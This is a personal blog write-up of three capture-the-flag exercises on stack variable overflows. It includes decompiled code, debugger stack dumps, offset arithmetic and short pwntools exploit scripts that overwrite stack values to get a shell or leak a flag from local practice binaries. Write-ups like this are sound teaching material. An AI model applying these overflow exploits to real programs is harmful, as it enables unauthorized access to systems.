---
title: "Learning Bin Exp from Scratch 02"
date: "2024-05-26T11:59:59.999Z"
description: "Variable Overflows"
author: "ZyphenSVC"
slug: "posts/binexp/2024-05-26-binexp"
---

> Forenote

I'm bored... Might as well become a god of binary exploitation.

This would not be possible if it wasnt for [Nightmare by guyinatuxedo](https://guyinatuxedo.github.io/index.html). This series is a compilation of my summarized notes and remarks done by me and me alone.

# Variable Overflows

In this section of the guide, we only have challenges to learn from. Practically pratical learning. Lets get started.

## CSAW 2018 Boi

Some recon work:

```bash
$ checksec boi
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/zyphen/.cache/.pwntools-cache-2.7/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.3.1 --> 4.12.0).
    Update with: $ pip install -U pwntools
[*] '/mnt/e/downloads/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```bash
$ ./boi
Are you a big boiiiii??
aaaaaaaaaaaaaaaaaaaaaaaa
Sun May 26 13:51:01 EDT 2024

$ wc
aaaaaaaaaaaaaaaaaaaaaaaa
      1       1      25
```

Popping this file into ghidra, we find the following with notes:

```c
int main(void)

{
  long in_FS_OFFSET;
  undefined8 stack_loc;
  undefined8 local_30;
  undefined4 uStack_28;
  int target;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  stack_loc = 0;
  local_30 = 0;
  local_20 = 0;
                    /* set as 0xdeadbeef */
  uStack_28 = 0;
  target = -0x21524111;
  puts("Are you a big boiiiii??");
                    /* 24 char */
  read(0,&stack_loc,0x18);
                    /* Checking listing window, we want 0xcaf3baee */
  if (target == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```armasm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __stdcall main(void)
             int               EAX:4          <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00400659(W), 
                                                                                                   004006ca(R)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[1]:     00400677(W)  
             undefined4        Stack[-0x24]:4 target                                  XREF[2]:     0040067e(W), 
                                                                                                   004006a5(R)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
             undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W), 
                                                                                                   0040068f(*)  
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0040054d(*), 004007b4, 
                                                                                          00400868(*)  
        00400641 55              PUSH       RBP
```
Note that the target is located at `-0x24` and input is located at `-0x38`. Thus there is 20 bytes of data between these two locations. `0x18 - 20 = 4`. Let's look at the GDB interpretation of this:

```armasm
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x14
$rbx   : 0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rcx   : 0xfffffffffffff27d
$rdx   : 0x18
$rsp   : 0x00007ffffffed810  →  0x00007ffffffed948  →  0x00007ffffffedb8f  →  "/mnt/e/downloads/boi"
$rbp   : 0x00007ffffffed850  →  0x0000000000000000
$rsi   : 0x00007ffffffed820  →  0x6161616161616161 ("aaaaaaaa"?)
$rdi   : 0x0
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x18
$r9    : 0x00007fffff5a7548  →  0x0000000000000000
$r10   : 0xfffffffffffff27d
$r11   : 0xfffffffffffff27d
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffffffed940  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffffffed810│+0x0000: 0x00007ffffffed948  →  0x00007ffffffedb8f  →  "/mnt/e/downloads/boi"         ← $rsp
0x00007ffffffed818│+0x0008: 0x000000010040072d
0x00007ffffffed820│+0x0010: 0x6161616161616161   ← $rsi
0x00007ffffffed828│+0x0018: 0x6161616161616161
0x00007ffffffed830│+0x0020: 0xdeadbeef0a616161
0x00007ffffffed838│+0x0028: 0x0000000000000000
0x00007ffffffed840│+0x0030: 0x00007ffffffed940  →  0x0000000000000001
0x00007ffffffed848│+0x0038: 0x3904d3c7d8855000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Note that at the 0x20 in the stack, we have the occurance of `616161`, which shows that our a's are impeding onto that stack value. Thus we should be able to rewrite the value of target from `0xdeadbeef` to `0xcaf3baee`. Lets see how many letters were written so far.

```bash
$ wc
aaaaaaaaaaaaaaaaaaa
      1       1      20
```

Coincidence? I believe not!

Let's try this out:

```armasm
gef➤  r
Starting program: /mnt/e/downloads/boi
Are you a big boiiiii??
aaaaaaaaaaaaaaaaaaacaf3baee

Breakpoint 1, 0x00000000004006a5 in main ()
/home/zyphen/.gdbinit-gef.py:2488: DeprecationWarning: invalid escape sequence '\ÿ'
  res = gdb.Value(address).cast(char_ptr).string(encoding=encoding, length=length).strip()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18
$rbx   : 0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rcx   : 0xfffffffffffff27d
$rdx   : 0x18
$rsp   : 0x00007ffffffed810  →  0x00007ffffffed948  →  0x00007ffffffedb8f  →  "/mnt/e/downloads/boi"
$rbp   : 0x00007ffffffed850  →  0x0000000000000000
$rsi   : 0x00007ffffffed820  →  "aaaaaaaaaaaaaaaaaaacaf3b"
$rdi   : 0x0
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x18
$r9    : 0x00007fffff5a7548  →  0x0000000000000000
$r10   : 0xfffffffffffff27d
$r11   : 0xfffffffffffff27d
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffffffed940  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffffffed810│+0x0000: 0x00007ffffffed948  →  0x00007ffffffedb8f  →  "/mnt/e/downloads/boi"         ← $rsp
0x00007ffffffed818│+0x0008: 0x000000010040072d
0x00007ffffffed820│+0x0010: "aaaaaaaaaaaaaaaaaaacaf3b"   ← $rsi
0x00007ffffffed828│+0x0018: 0x6161616161616161
0x00007ffffffed830│+0x0020: "aaacaf3b"
0x00007ffffffed838│+0x0028: 0x0000000000000000
0x00007ffffffed840│+0x0030: 0x00007ffffffed940  →  0x0000000000000001
0x00007ffffffed848│+0x0038: 0x741c47ef4a4af100
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
```
Wait? Why is our `caf3baee` cut short? It seems to be off by 4 bytes (characters)! Our offset was that exact amount.

Sorry to take you off trail, but this is only ascii text. Not actual hex bytes. Let's fix that using python.

```python
from pwn import *

target = process("./boi")

p = b"a"*20 + p64(0xcaf3baee)

target.send(p)
target.interactive()
```

```bash
python3 ape.py
[+] Starting local process './boi': pid 551
[*] Switching to interactive mode
Are you a big boiiiii??
$ echo hello
hello
$
```

Perfect! We have Smashed the Stack!

## TAMU 2019 Pwn1

Recon work first:

```bash
$ file pwn1
pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped

$ checksec pwn1
[*] '/mnt/e/downloads/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Now I use WSL2. For those having problems executing 32 bit binaries on their WSL system, or even an debian based system unfortunately, we have the following solution:

[StackOverflow](https://stackoverflow.com/questions/42120938/exec-format-error-32-bit-executable-windows-subsystem-for-linux)

```bash
sudo apt-get install libc6-i386
sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'
sudo service binfmt-support start
```

Now everything should be able to run!

```bash
$ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
FINALLY 32 BIT ARCHITECTURE
I don't know that! Auuuuuuuugh!
```

Now in ghidra:

```c
int main(char *param_1)

{
  int cmp;
  char input [43];
  int key;
  undefined4 local_14;
  char **local_10;
  
  local_10 = &param_1;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  key = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,_stdin);
                    /* 1st Passcode */
  cmp = strcmp(input,"Sir Lancelot of Camelot\n");
  if (cmp != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,_stdin);
                    /* 2nd Passcode */
  cmp = strcmp(input,"To seek the Holy Grail.\n");
  if (cmp != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
                    /* Vulnerable gets statement. Can stack overflow. Check GDB */
  gets(input);
                    /* key = 0xdea110c8 */
  if (key == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

```armasm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __cdecl main(char * param_1)
             int               EAX:4          <RETURN>                                XREF[1]:     00010807(W)  
             char *            Stack[0x4]:4   param_1                                 XREF[1]:     00010779(*)  
             undefined4        EAX:4          cmp                                     XREF[1]:     00010807(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     00010780(R), 
                                                                                                   000108df(*)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 key                                     XREF[2]:     000107b4(W), 
                                                                                                   000108b2(R)  
             undefined1[43]    Stack[-0x43]   input                                   XREF[5]:     000107ed(*), 
                                                                                                   00010803(*), 
                                                                                                   0001084f(*), 
                                                                                                   00010865(*), 
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:000105e6(*), 00010ab8, 
                                                                                          00010b4c(*), 00011ff8(*)  
        00010779 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]

```

I have taken into account that we are dealing with a vulnerable gets statement. Meaning we can overflow the buffer of the input variable and keep writing into the stack, a stack overflow. Thus if we calculate using whats above the location of the key, we find `0x43 - 0x18 = 43`. Thus this is the space for our offset.

```python
from pwn import *

target = process("./pwn1")

offset = 43

p = b"a"*offset + p32(0xdea110c8)

target.send(b'Sir Lancelot of Camelot\n')
target.send(b'To seek the Holy Grail.\n')
target.send(p)
target.interactive()
```

```bash
$ python3 ape.py
[+] Starting local process './pwn1': pid 31410
[*] Switching to interactive mode
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
$ ls
Right. Off you go.
flag{g0ttem_b0yz}

[*] Got EOF while reading in interactive
$
```

## TokyoWesterns 2017 Just Do It!

Rinse and Repeat! Recon:

```bash
$ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
hey
Invalid Password, Try Again!

$ file just_do_it
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped

$ checksec just_do_it
[*] '/mnt/e/downloads/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Ghidra:

```c
int main(undefined param_1)

{
  char *stack;
  int pswdcmp;
  char input [16];
  FILE *flag_file;
  char *password_msg;
  undefined1 *local_c;
  
  local_c = &param_1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  password_msg = failed_message;
  flag_file = fopen("flag.txt","r");
  if (flag_file == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
                    /* Retrieve the flag from this variable instatiation
                       48 bytes of data
                       loc = 0x0804a080 */
  stack = fgets(flag,0x30,flag_file);
  if (stack == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
                    /* resets with the new password, need to memory retrieve from here
                    Note that it used fgets */
  stack = fgets(input,0x20,stdin);
  if (stack == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pswdcmp = strcmp(input,PASSWORD);
  if (pswdcmp == 0) {
    password_msg = success_message;
  }
  puts(password_msg);
  return 0;
}
```

```armasm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __cdecl main(undefined1 param_1)
             int               EAX:4          <RETURN>                                XREF[2]:     080486aa(W), 
                                                                                                   080486dd(W)  
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     080485bb(*)  
             undefined4        EAX:4          stack                                   XREF[2]:     080486aa(W), 
                                                                                                   080486dd(W)  
             undefined4        EAX:4          pswdcmp                                 XREF[1]:     080486dd(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     080485c2(R), 
                                                                                                   08048708(*)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048704(R)  
             undefined4        Stack[-0x14]:4 password_msg                            XREF[2]:     0804860d(W), 
                                                                                                   080486ee(W)  
             undefined4        Stack[-0x18]:4 flag_file                               XREF[3]:     08048625(W), 
                                                                                                   08048628(R), 
                                                                                                   0804864b(R)  
             undefined1[16]    Stack[-0x28]   input                                   XREF[2]:     080486a6(*), 
                                                                                                   080486d9(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080484d7(*), 0804886c, 
                                                                                          080488c8(*)  
        080485bb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]

```

We have to note that even though it looks like we need to offset the buffer of the input variable, we actually need to calculate until the password_msg. `0x28 - 0x14 = 20`. Offset is 20 and we have the location of the flag file.

```python
from pwn import *

target = process("./just_do_it")

offset = 20

p = b"a"*offset + p32(0x0804a080)

target.send(p)
target.interactive()
```

```bash
$ python3 ape.py
[+] Starting local process './just_do_it': pid 31465
[*] Switching to interactive mode
Welcome my secret service. Do you know the password?
Input the password.
$ ls
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive
```

See you tomorrow